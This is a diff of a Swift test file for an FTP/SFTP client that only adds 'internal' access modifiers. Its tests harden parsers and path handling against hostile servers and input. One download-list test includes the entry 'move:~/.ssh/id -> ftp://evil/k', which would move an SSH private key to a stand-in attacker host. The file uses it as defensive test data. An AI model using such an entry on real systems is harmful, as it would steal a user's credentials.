@@ -14,9 +14,9 @@ private func reproducer(_ name: String) throws -> Data {
 /// What a server sends is read in time that grows with its length and nothing else, and is
 /// taken only as far as it makes sense (review 2: N001, N004, N023, N024, N025, N074, N155).
 @Suite
-struct Review2NetworkHostileServers {
+internal struct Review2NetworkHostileServers {
     @Test
-    func theLineThatMadeTheListingHangIsReadAtOnce() throws {
+    internal func theLineThatMadeTheListingHangIsReadAtOnce() throws {
         let line = String(decoding: try reproducer("ftplist-regex-backtracking.txt"), as: UTF8.self)
         // With the patterns it was read with before, each of these took seconds (one of 16 KB a
         // minute). Two hundred of them, and of the worst that fit into a line, are nothing now.
@@ -32,7 +32,7 @@ struct Review2NetworkHostileServers {
     }
 
     @Test
-    func aLineThatIsTooLongIsNoEntry() {
+    internal func aLineThatIsTooLongIsNoEntry() {
         let name = String(repeating: "n", count: FTPListParser.longestLine)
         #expect(FTPListParser.list("-rw-r--r-- 1 o g 5 Jan 01 2020 " + name) == nil)
         #expect(FTPListParser.mlsd("type=file;size=5; " + name) == nil)
@@ -40,7 +40,7 @@ struct Review2NetworkHostileServers {
     }
 
     @Test
-    func theFormatsAreStillRead() throws {
+    internal func theFormatsAreStillRead() throws {
         var calendar = Calendar(identifier: .gregorian)
         calendar.timeZone = try #require(TimeZone(identifier: "UTC"))
         let now = try #require(calendar.date(from: DateComponents(year: 2_024, month: 6, day: 15)))
@@ -89,7 +89,7 @@ struct Review2NetworkHostileServers {
     }
 
     @Test
-    func sizesAndDatesAreTakenAsFarAsTheyMakeSense() {
+    internal func sizesAndDatesAreTakenAsFarAsTheyMakeSense() {
         let huge = String(repeating: "9", count: 40)
         #expect(FTPListParser.list("-rw-r--r-- 1 o g \(huge) Jan 01 2020 big")?.size == .max)
         #expect(FTPListParser.mlsd("type=file;size=\(huge); big")?.size == .max)
@@ -110,7 +110,7 @@ struct Review2NetworkHostileServers {
     }
 
     @Test
-    func aListingIsCutIntoLinesByteByByteOnce() {
+    internal func aListingIsCutIntoLinesByteByByteOnce() {
         let text = "one\r\ntwo\n\nlast without end"
         var whole = LineSplitter()
         #expect(whole.feed(Data(text.utf8)).map { String(decoding: $0, as: UTF8.self) } == ["one", "two", ""])
@@ -140,7 +140,7 @@ struct Review2NetworkHostileServers {
     }
 
     @Test
-    func aReplyIsKeptOnlyUpToItsLargestSize() {
+    internal func aReplyIsKeptOnlyUpToItsLargestSize() {
         var parser = FTPReplyParser()
         #expect(parser.feed("220-Welcome") == nil)
         for index in 0..<50_000 { #expect(parser.feed(" line \(index) " + String(repeating: "x", count: 100)) == nil) }
@@ -157,7 +157,7 @@ struct Review2NetworkHostileServers {
 /// Paths, addresses and saved connections from text that anybody may have written
 /// (review 2: N002, N008, N041, N101).
 @Suite
-struct Review2NetworkAddresses {
+internal struct Review2NetworkAddresses {
     /// What the fuzzer checks of a normalised path, read as text the way the rest of the program reads it.
     private func isClean(_ path: String) -> Bool {
         path.hasPrefix("/") && !path.contains("//") && !path.split(separator: "/").contains("..")
@@ -165,7 +165,7 @@ struct Review2NetworkAddresses {
     }
 
     @Test
-    func aPathIsCutAtTheBytesOfTheSlash() throws {
+    internal func aPathIsCutAtTheBytesOfTheSlash() throws {
         let mark = String(decoding: try reproducer("remotepath-slash-joins-combining-mark.bin"), as: UTF8.self)
         #expect(mark.unicodeScalars.count == 1)
         // A slash followed by a combining mark is one character; it is a separator all the same.
@@ -202,7 +202,7 @@ struct Review2NetworkAddresses {
     }
 
     @Test
-    func anyTextGivesACleanPath() {
+    internal func anyTextGivesACleanPath() {
         // What the fuzzer does, in small: texts made of the pieces that matter, in every order.
         let pieces = [
             "/", ".", "..", "a", "\u{301}", "\u{600}", "\u{200D}", "é", " ", "\u{1F1E9}", "//", "\u{FFFD}", "\u{FE0F}"
@@ -228,7 +228,7 @@ struct Review2NetworkAddresses {
     }
 
     @Test
-    func theFileSystemRefusesAPathWithSuchAName() throws {
+    internal func theFileSystemRefusesAPathWithSuchAName() throws {
         let center = ConnectionCenter()
         // Used by the callbacks, which run one at a time while the calls below wait for them.
         nonisolated(unsafe) var made = 0
@@ -244,7 +244,7 @@ struct Review2NetworkAddresses {
     }
 
     @Test
-    func aSavedConnectionWithAPortThatIsNoneDoesNotTrap() throws {
+    internal func aSavedConnectionWithAPortThatIsNoneDoesNotTrap() throws {
         let saved = try JSONDecoder()
             .decode(
                 [SavedConnection].self,
@@ -285,7 +285,7 @@ struct Review2NetworkAddresses {
     }
 
     @Test
-    func aHostWithoutAURLIsNoAddress() throws {
+    internal func aHostWithoutAURLIsNoAddress() throws {
         for text in [
             "ftp://ho%st/", "ftp://a#b/", "ftp://a?b", "ftp://a\"b/", "ftp://a<b/", "ftp://a^b/", "ftp://a{b/",
             "ftp://a|b/", "a\u{202E}b"
@@ -309,9 +309,9 @@ struct Review2NetworkAddresses {
 
 /// What a download list may hold and what it says (review 2: N016, N020, N033, N070, N075).
 @Suite
-struct Review2NetworkDownloadLists {
+internal struct Review2NetworkDownloadLists {
     @Test
-    func aNameWithALineBreakIsNotWritten() {
+    internal func aNameWithALineBreakIsNotWritten() {
         #expect(DownloadList.canHold(source: "ftp://h/pub/a b.txt", target: "/Users/me/Downloads/a b.txt"))
         #expect(DownloadList.canHold(source: "ftp://h/a", target: nil))
         for breaker in ["\n", "\r", "\u{2028}", "\u{2029}", "\u{85}", "\u{B}", "\u{C}", "\0"] {
@@ -333,7 +333,7 @@ struct Review2NetworkDownloadLists {
     }
 
     @Test
-    func aListSaysWhatEachLineIs() {
+    internal func aListSaysWhatEachLineIs() {
         let actions = DownloadList.parse(
             "ftp://h/a -> /t/a\nput:/src -> ftp://h/b\nmove:~/.ssh/id -> ftp://evil/k\nsleep:999999999\nsleep:-5\nsleep:nan\nput:\n"
         )
@@ -351,7 +351,7 @@ struct Review2NetworkDownloadLists {
     }
 
     @Test
-    func theFileOfAListHasALargestSize() throws {
+    internal func theFileOfAListHasALargestSize() throws {
         let box = try Sandbox()
         let small = try box.file("small.txt", "ftp://h/a\n")
         #expect(try NetworkCommands.readList(small) == "ftp://h/a\n")
@@ -365,9 +365,9 @@ struct Review2NetworkDownloadLists {
 
 /// Secrets and questions (review 2: N088, N091, N099, N104, N105, and the mark on downloads N009).
 @Suite
-struct Review2NetworkSecrets {
+internal struct Review2NetworkSecrets {
     @Test
-    func aQuestionOfTheSecureShellIsToldByItsShape() {
+    internal func aQuestionOfTheSecureShellIsToldByItsShape() {
         #expect(
             SSHQuestion("alice@files.example.com's password: ") == .password(user: "alice", host: "files.example.com")
         )
@@ -400,7 +400,7 @@ struct Review2NetworkSecrets {
     }
 
     @Test
-    func theStoredPasswordGoesToThisLoginOnly() {
+    internal func theStoredPasswordGoesToThisLoginOnly() {
         let profile = ConnectionProfile(
             key: ServerKey(scheme: "sftp", host: "files.example.com"),
             user: "alice@corp.example",
@@ -415,7 +415,7 @@ struct Review2NetworkSecrets {
     }
 
     @Test
-    func theArgumentsForTheSecureShell() {
+    internal func theArgumentsForTheSecureShell() {
         var values = NetworkOptions.Values()
         (values.timeout, values.keepAliveInterval) = (20, 0)
         let arguments = SFTPSession.sshArguments(
@@ -434,7 +434,7 @@ struct Review2NetworkSecrets {
     }
 
     @Test
-    func anAnswerLeftBehindDoesNotAnswerTheNextQuestion() throws {
+    internal func anAnswerLeftBehindDoesNotAnswerTheNextQuestion() throws {
         let helper = try AskpassHelper()
         // Written for a helper that ssh has ended meanwhile: nobody takes it.
         helper.reply("the old secret", to: AskpassHelper.Question(id: "1.1", kind: .entry, text: "old"))
@@ -481,7 +481,7 @@ struct Review2NetworkSecrets {
     }
 
     @Test
-    func noAddressIsShownWithItsPassword() {
+    internal func noAddressIsShownWithItsPassword() {
         #expect(ServerAddress.removingPassword(from: "user:secret@host.example") == "user@host.example")
         #expect(ServerAddress.removingPassword(from: "smb://u:se/cr#et?@nas.local/share") == "smb://u@nas.local/share")
         #expect(ServerAddress.removingPassword(from: "host.example:2121/pub") == "host.example:2121/pub")
@@ -489,7 +489,7 @@ struct Review2NetworkSecrets {
     }
 
     @Test
-    func whatComesFromAServerIsMarkedAsDownloaded() throws {
+    internal func whatComesFromAServerIsMarkedAsDownloaded() throws {
         let center = ConnectionCenter()
         center.agentName = "Some; Program"
         let fileSystem = RemoteFileSystem(scheme: "sftp", center: center)
@@ -510,7 +510,7 @@ struct Review2NetworkSecrets {
     }
 
     @Test
-    func aNameGoesBackToTheServerAsItCame() throws {
+    internal func aNameGoesBackToTheServerAsItCame() throws {
         let names = NameMemory()
         // Not UTF-8 on the server: read as Western Latin 1, and written back as the same bytes.
         let read = NameEncoding.automatic.decodeTelling(Data([0x47, 0x72, 0xFC, 0xDF, 0x65]))
